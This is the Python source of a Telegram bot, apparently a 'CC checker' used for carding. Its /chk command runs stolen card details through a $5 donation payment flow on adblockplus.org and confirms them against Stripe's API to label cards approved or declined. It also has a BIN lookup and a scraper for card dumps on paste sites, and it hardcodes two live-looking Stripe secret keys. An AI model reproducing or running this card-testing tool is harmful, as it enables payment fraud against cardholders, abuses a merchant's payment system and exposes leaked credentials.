
from telegram import InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ( CommandHandler, Filters, MessageHandler, Updater)
from message import Editmessage, Sendmessage, logger
from Miscellaneous.Scraper import pastebin, text_scraper, throwbin, ghostbin
import os
import requests
from bs4 import BeautifulSoup
import random
import string
import time
import json
import math
from collections import OrderedDict

os.environ['TZ'] = 'America/Buenos_Aires'
bot_token = os.environ.get('TG_BOT_TOKEN')
startmessage = [[
		InlineKeyboardButton(
			"Dev",
			url='https://t.me/asur_sinchan'
		),
        InlineKeyboardButton(
			"Channel",
			url='https://t.me/asurccworld'
		)
        ]]

#random str GEN FOR EMAIL
N = 10
rnd = ''.join(random.choices(string.ascii_lowercase +
                                string.digits, k = N))

def start(update, context):
    info = update.effective_user
    print(info)
    chat_id = info.id
    userid= info['username']
    text = f'Welcome @{userid}, to cc checker bot, to know more use /help  This bot is provided for educational use only, any misuse then you should be responsible.'
    Sendmessage(chat_id, text, reply_markup=InlineKeyboardMarkup(startmessage))
    return

    
####################################################################################################################################3
# help botstart botcmds botinfo bin

def help(update, context):
    chat_id = update.message.chat_id
    text = "Available cmds available:\n /botinfo \n /bin \n /botcmds \n /help \n /botstart \n MORE WILL BE UPDATED SOON"
    Sendmessage(chat_id, text, reply_markup= InlineKeyboardMarkup(startmessage))
def botstart(update, context):
    chat_id = update.message.chat_id
    text = "Hey! I am a CC-Checker!"
    Sendmessage(chat_id, text)
def botcmds(update, context):
    chat_id = update.message.chat_id
    text = "Hey, welcome to this Bot! Below I show you all available commands: \n Bin lookup: /bin xxxxxx \n SK-Chck: /sk sk_live_xxxxxxxxxxx \n CC-Check:/chk xxxxxxxxxxxx|xx|xx|xxx"
    Sendmessage(chat_id, text)
def botinfo(update, context):
    chat_id = update.message.chat_id
    text = "Hey! I am a CC-Checker bot with a few extras. Send /botcmds for a list of all commands!"
    Sendmessage(chat_id, text)

def bin(update, context):
    chat_id = update.message.chat_id
    info = update.effective_user
    chat_id = info.id
    userid= info['username']
    text =  update.message.text.split(' ', 1)
    if text[-1].isdigit():
        r = requests.get("https://lookup.binlist.net/" + str(text[1][:6]))
        url=r.text
        if len(url)>5:
             res=json.loads(url)
             ab=text[-1]

             if "bank" not in res:
                  res["bank"] = {'name': 'Unavailable'}

             if "country" not in res:
                  res["country"] = {"name": "Unavailable" , "emoji": " " , "currency": "--"}

             elif "type" not in res:
                  res["type"] = "Unavailable"
	
             bb=res["scheme"]
             dia='✅'
             
             
             
             dd=res["type"]
            
             true,false=True,False
             
             dd=res["type"]
             p=("Valid Bin! {} \n ━━━━━━━━━━━━━━━  \n • Bin: {} \n • Country: {} {} \n • Bank: {} \n • Scheme: {} \n • Type: {} \n • Currency: {} \n━━━━━━━━━━━━━━━ \n 👤 Checked By: @ASURCCWORLDBOT\n Used By @{}")
             text=p.format(dia ,ab[:6] ,res["country"]["name"],res["country"]["emoji"],res["bank"]["name"],bb,dd,res["country"]["currency"],userid)
             Sendmessage(chat_id, text)
        else:
             chat_id = update.message.chat_id
             info = update.effective_user
             chat_id = info.id
             userid= info['username']
             ab=text[-1]
             wdia='❌'
             p = "Not Valid Bin!{} \n ━━━━━━━━━━━━━━━  \n • Bin: {} \n ━━━━━━━━━━━━━━━ \n👤 Checked By: @ASURCCWORLDBOT\n  Used By @{}"
             text = p.format(wdia,ab[:6],userid)
             Sendmessage(chat_id, text)
             
    else:
        chat_id = update.message.chat_id
        info = update.effective_user
        chat_id = info.id
        userid= info['username']
        ab=text[-1]
        wdia='❌'
        p = "Not Valid Bin!{} \n ━━━━━━━━━━━━━━━  \n • Bin: {} \n 👤 Checked By: @ASURCCWORLDBOT\n Used By @{}"
        text = p.format(wdia,ab[:6],userid)
        Sendmessage(chat_id, text)
################################################################################################################################

def chk(update,context):
    chat_id = update.message.chat_id
    info = update.effective_user
    chat_id = info.id
    userid= info['username']
    tic = time.perf_counter()
    text =  update.message.text.split(' ', 1)
    maintxt=text[-1]
    i=maintxt.split("|")
    cc=i[0]
    mon=i[1]
    year=i[2]
    cvv=i[3]
    email = f"{str(rnd)}@gmail.com"
    skeys = OrderedDict([(1,'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')]);
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4571.0 Safari/537.36 Edg/93.0.957.0","Accept": "application/json, text/plain, */*","Content-Type": "application/x-www-form-urlencoded"}
    s = requests.post("https://m.stripe.com/6",headers=headers)
    r = s.json()
    Guid = r["guid"]
    Muid = r["muid"]
    Sid = r["sid"]
    payload = {
      "lang": "en",
      "type": "donation",
      "currency": "USD",
      "amount": "5",
      "custom": "x-0-b43513cf-721e-4263-8d1d-527eb414ea29",
      "currencySign": "$"
    }
    
    head = {
      "User-Agent": "Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Mobile Safari/537.36",
      "Content-Type": "application/x-www-form-urlencoded",
      "Accept": "*/*",
      "Origin": "https://adblockplus.org",
      "Sec-Fetch-Dest": "empty",
      "Referer": "https://adblockplus.org/",
      "Accept-Language": "en-US,en;q=0.9"
    }
    
    re = requests.post("https://new-integration.adblockplus.org/",
                     data=payload, headers=head)
    client = re.text
    pi = client[0:27]
    

    load = {
      "receipt_email": email,
      "payment_method_data[type]": "card",
      "payment_method_data[billing_details][email]": email,
      "payment_method_data[card][number]": cc,
      "payment_method_data[card][cvc]": cvv,
      "payment_method_data[card][exp_month]": mon,
      "payment_method_data[card][exp_year]": year,
      "payment_method_data[guid]": Guid,
      "payment_method_data[muid]": Muid,
      "payment_method_data[sid]": Sid,
      "payment_method_data[payment_user_agent]": "stripe.js/af38c6da9;+stripe-js-v3/af38c6da9",
      "payment_method_data[referrer]": "https://adblockplus.org/",
      "expected_payment_method_type": "card",
      "use_stripe_sdk": "true",
      "webauthn_uvpa_available": "true",
      "spc_eligible": "false",
      "key": "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",
      "client_secret": client
    }
    
    header = {
      "User-Agent": "Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Mobile Safari/537.36",
      "Content-Type": "application/x-www-form-urlencoded",
      "Accept": "application/json",
      "Origin": "https://js.stripe.com",
      "Referer": "https://js.stripe.com/",
      "Accept-Language": "en-US,en;q=0.9"
    }
    
    rx = requests.post(f"https://api.stripe.com/v1/payment_intents/{pi}/confirm",
                     data=load, headers=header)
    res = rx.json()
    msg = res["error"]["message"]
    toc = time.perf_counter()
    if "incorrect_cvc" in rx.text:
        text = (f"""
✅<b>CC</b>➟ <code>{cc}</code>
<b>STATUS</b>➟ #ApprovedCCN
<b>MSG</b>➟ {msg}
<b>TOOK:</b> <code>{toc - tic:0.4f}</code>(s)
<b>CHKBY</b>➟ <a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a>
""")
        Sendmessage(chat_id , text)
    elif "Unrecognized request URL" in rx.text:
        text = ("[UPDATE] PROXIES ERROR")
        Sendmessage(chat_id , text)
    elif rx.status_code == 200:
        text = (f"""
✔️<b>CC</b>➟ <code>{cc}</code>
<b>STATUS</b>➟ #ApprovedCVV
<b>TOOK:</b> <code>{toc - tic:0.4f}</code>(s)
<b>CHKBY</b>➟ <a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a>
""")
        Sendmessage(chat_id , text)
    else:
        text=(f"""
❌<b>CC</b>➟ <code>{cc}</code>
<b>STATUS</b>➟ Declined
<b>MSG</b>➟ {msg}
<b>TOOK:</b> <code>{toc - tic:0.4f}</code>(s)
<b>CHKBY</b>➟ <a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a>
""")
        Sendmessage(chat_id , text)
#########################################################################################################
	
def scraperdfnc(update, context):
    msg = update.message.text
    status_msg = update.message
    chat_id = status_msg.chat_id
    try:
        if 'pastebin' in msg:
            link = msg.split(' ')[1]
            pastebin(chat_id,link)
        elif 'ghostbin' in msg:
            link = msg.split(' ')[1]
            ghostbin(chat_id,link)
        else:
            scrape_text = status_msg['reply_to_message']['text']
            text_scraper(chat_id, scrape_text)
    except:
        Sendmessage(chat_id, 'Only Supports pastebin, please check if you send paste bin link')

def main():
    updater = Updater(
        bot_token,
        use_context=True
    )
    dp = updater.dispatcher
    #dp.add_handler(MessageHandler(Filters.text & ~Filters.command, duty))
    dp.add_handler(CommandHandler("scrape", scraperdfnc))
    dp.add_handler(CommandHandler("start", start))
    dp.add_handler(CommandHandler("help", help))
    dp.add_handler(CommandHandler("botinfo", botinfo))
    dp.add_handler(CommandHandler("botcmds", botcmds))
    dp.add_handler(CommandHandler("chk", chk))
    dp.add_handler(CommandHandler("bin", bin))
    dp.add_handler(CommandHandler("botstart", botstart))
    logger.info("Bot Started!!!")
    updater.start_polling()
    updater.idle()


if __name__ == "__main__":
    main()
